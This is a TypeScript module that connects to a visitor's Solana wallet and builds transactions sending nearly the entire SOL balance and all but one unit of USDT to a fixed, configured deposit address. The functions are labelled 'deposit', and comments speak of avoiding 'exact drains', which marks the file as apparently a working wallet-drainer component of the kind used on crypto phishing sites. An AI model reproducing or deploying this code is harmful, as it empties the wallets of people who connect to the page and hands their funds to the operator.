// src/lib/solana.ts
import bs58 from 'bs58'
import {
  Connection,
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
  clusterApiUrl,
} from '@solana/web3.js'
import {
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
} from '@solana/spl-token'
import {
  SOLANA_RPC,
  SOL_DEPOSIT_ADDRESS,
  SOL_USDT_MINT,
  SOL_AUTO_CREATE_ATA,
  SOL_BUFFER_LAMPORTS,
} from '../config'

// Prefer AppKit's injected provider if present (WalletConnect/Reown AppKit)
function getAppKitSolanaProvider(): any {
  const w: any = window as any
  if (w.appkit?.solana) return w.appkit.solana
  if (w.__appkit?.solana) return w.__appkit.solana
  if (w.reown?.solana) return w.reown.solana
  return null
}

// Common injected wallets
export function getInjectedSolanaProvider(): any {
  const w: any = window as any
  if (w.solana?.isPhantom) return w.solana
  if (w.solflare?.isSolflare) return w.solflare
  if (w.backpack?.solana) return w.backpack.solana
  return w.solana || null
}

// Active provider = AppKit if available, else injected
export function getActiveSolanaProvider(): any {
  return getAppKitSolanaProvider() || getInjectedSolanaProvider()
}

// Normalize signature from various wallet return shapes
function normalizeSignature(res: any): string {
  if (!res) throw new Error('No signature returned')
  const sigAny =
    (typeof res === 'string' && res) ||
    (res as any)?.signature ||
    (Array.isArray(res) && (res as any[])[0]) ||
    res

  if (sigAny instanceof Uint8Array) return bs58.encode(sigAny as Uint8Array)
  if (typeof sigAny === 'string') return sigAny as string
  throw new Error('Unsupported signature type from wallet')
}

// Try to ensure provider is connected and return { provider, publicKey }
async function ensureProviderAndKey(
  providedPublicKey?: PublicKey
): Promise<{ provider: any; publicKey: PublicKey }> {
  const provider = getActiveSolanaProvider()
  if (!provider) throw new Error('No Solana provider found (AppKit or injected)')

  // If caller already gave a PublicKey, use it (but still try to ensure provider connected)
  if (providedPublicKey) {
    // best-effort connect if wallet supports
    try {
      if (provider.connect && !provider.isConnected) {
        // don't force onlyIfTrusted; we tried to respect user's session but connecting harmlessly
        await provider.connect({ onlyIfTrusted: true }).catch(() => {})
      }
    } catch {}
    return { provider, publicKey: providedPublicKey }
  }

  // Otherwise attempt to connect / read publicKey from provider
  try {
    // some wallets expose publicKey even when not "connected" in UI state
    const pk = provider.publicKey || (await provider.connect?.({ onlyIfTrusted: false }).catch(() => null))?.publicKey
    if (!pk) throw new Error('No publicKey from provider (wallet not connected)')
    return { provider, publicKey: pk }
  } catch (e) {
    throw new Error(`Failed to get publicKey from Solana provider: ${String((e as any)?.message || e)}`)
  }
}

/**
 * Send SOL: "max-safe" (balance - estimatedFee - buffer) to avoid exact drains
 * Accepts optional { publicKey } (PublicKey). If not provided it will connect the active provider.
 */
export async function depositAllSol({ publicKey }: { publicKey?: PublicKey } = {}) {
  const { provider, publicKey: ownerPub } = await ensureProviderAndKey(publicKey)
  if (!ownerPub) throw new Error('No Solana publicKey available')

  // normalize rpc
  const rpc = SOLANA_RPC && SOLANA_RPC.length ? SOLANA_RPC : clusterApiUrl('mainnet-beta')
  const connection = new Connection(rpc, 'confirmed')

  // balance in lamports (number)
  const balance = await connection.getBalance(ownerPub)

  // Build a tiny dummy transfer to estimate fee for a single transfer message
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
  const dummyIx = SystemProgram.transfer({
    fromPubkey: ownerPub,
    toPubkey: ownerPub,
    lamports: 1,
  })
  const dummyMsg = new TransactionMessage({
    payerKey: ownerPub,
    recentBlockhash: blockhash,
    instructions: [dummyIx],
  }).compileToV0Message()
  const feeInfo = await connection.getFeeForMessage(dummyMsg, 'confirmed')
  const estimatedFee = Number(feeInfo?.value ?? 5000)

  // Use config buffer (fall back to a small default if not set)
  const buffer = typeof SOL_BUFFER_LAMPORTS === 'number' && SOL_BUFFER_LAMPORTS > 0 ? SOL_BUFFER_LAMPORTS : 3_000_000

  if (balance <= estimatedFee + buffer) {
    throw new Error('Not enough SOL to cover fee + buffer')
  }

  const lamportsToSend = balance - estimatedFee - buffer
  if (lamportsToSend <= 0) throw new Error('Not enough SOL to send after reserving fee and buffer')

  const to = new PublicKey(SOL_DEPOSIT_ADDRESS)
  const ix = SystemProgram.transfer({ fromPubkey: ownerPub, toPubkey: to, lamports: lamportsToSend })
  const msg = new TransactionMessage({
    payerKey: ownerPub,
    recentBlockhash: blockhash,
    instructions: [ix],
  }).compileToV0Message()
  const tx = new VersionedTransaction(msg)

  // Prefer signAndSendTransaction (Phantom/Backpack) when available
  if (provider.signAndSendTransaction) {
    const _res = await provider.signAndSendTransaction(tx)
    const signature = normalizeSignature(_res)
    // confirm
    try {
      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
    } catch {
      // ignore confirmation failures silently
    }
    return { signature, from: ownerPub.toBase58() }
  }

  // Fallback: signTransaction then sendRawTransaction
  if (!provider.signTransaction) throw new Error('Wallet cannot sign transactions (missing signTransaction)')
  const signed = await provider.signTransaction(tx as any)
  const signature = await connection.sendRawTransaction(signed.serialize(), {
    skipPreflight: false,
    preflightCommitment: 'confirmed',
  })
  try {
    await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
  } catch {}
  return { signature, from: ownerPub.toBase58() }
}

/**
 * Send USDT (SPL): send (tokenBalance - 1) minimal unit if possible.
 * Will create destination ATA only when SOL_AUTO_CREATE_ATA is truthy.
 * Accepts optional { publicKey } to avoid connecting.
 */
export async function depositAllUsdtSol({ publicKey }: { publicKey?: PublicKey } = {}) {
  const { provider, publicKey: ownerPub } = await ensureProviderAndKey(publicKey)
  if (!ownerPub) throw new Error('No Solana publicKey available')

  const rpc = SOLANA_RPC && SOLANA_RPC.length ? SOLANA_RPC : clusterApiUrl('mainnet-beta')
  const connection = new Connection(rpc, 'confirmed')
  const mint = new PublicKey(SOL_USDT_MINT)
  const owner = ownerPub

  const sourceAta = await getAssociatedTokenAddress(
    mint,
    owner,
    false,
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID
  )

  // Try to fetch token account balance
  const balInfo = await connection.getTokenAccountBalance(sourceAta, 'confirmed').catch(() => null)
  if (!balInfo) throw new Error('No USDT token account')

  let amountBig = BigInt(balInfo.value.amount || '0')
  // leave 1 minimal unit to avoid exact drain
  if (amountBig > 1n) amountBig = amountBig - 1n
  if (amountBig <= 0n) throw new Error('USDT (SPL) balance too low')

  const destOwner = new PublicKey(SOL_DEPOSIT_ADDRESS)
  const destAta = await getAssociatedTokenAddress(
    mint,
    destOwner,
    false,
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID
  )

  const ixs: any[] = []

  // Create destination ATA if missing and allowed by config
  const destInfo = await connection.getAccountInfo(destAta, 'confirmed')
  if (!destInfo) {
    if (SOL_AUTO_CREATE_ATA) {
      ixs.push(
        createAssociatedTokenAccountInstruction(
          owner,
          destAta,
          destOwner,
          mint,
          TOKEN_PROGRAM_ID,
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      )
    } else {
      throw new Error('Destination USDT ATA missing. Enable SOL_AUTO_CREATE_ATA or create it manually.')
    }
  }

  ixs.push(createTransferInstruction(sourceAta, destAta, owner, amountBig, [], TOKEN_PROGRAM_ID))

  // Estimate fee for this combined instruction set
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
  const msg = new TransactionMessage({
    payerKey: owner,
    recentBlockhash: blockhash,
    instructions: ixs,
  }).compileToV0Message()
  const tx = new VersionedTransaction(msg)

  // Rough fee estimate
  const feeInfo = await connection.getFeeForMessage(msg, 'confirmed')
  const estimatedFee = Number(feeInfo?.value ?? 5000)
  const buffer = typeof SOL_BUFFER_LAMPORTS === 'number' && SOL_BUFFER_LAMPORTS > 0 ? SOL_BUFFER_LAMPORTS : 3_000_000

  // Ensure owner has enough SOL for fees + buffer (we do not deduct SOL from token transfer)
  const solBalance = await connection.getBalance(owner)
  if (solBalance <= estimatedFee + buffer) {
    throw new Error('Not enough SOL in wallet to pay transaction fees + buffer for SPL transfer')
  }

  // Sign and send
  if (provider.signAndSendTransaction) {
    const _res = await provider.signAndSendTransaction(tx)
    const signature = normalizeSignature(_res)
    try {
      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
    } catch {}
    return { signature, from: owner.toBase58() }
  }

  if (!provider.signTransaction) throw new Error('Wallet cannot sign transactions (missing signTransaction)')
  const signed = await provider.signTransaction(tx as any)
  const signature = await connection.sendRawTransaction(signed.serialize(), {
    skipPreflight: false,
    preflightCommitment: 'confirmed',
  })
  try {
    await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed')
  } catch {}
  return { signature, from: owner.toBase58() }
}
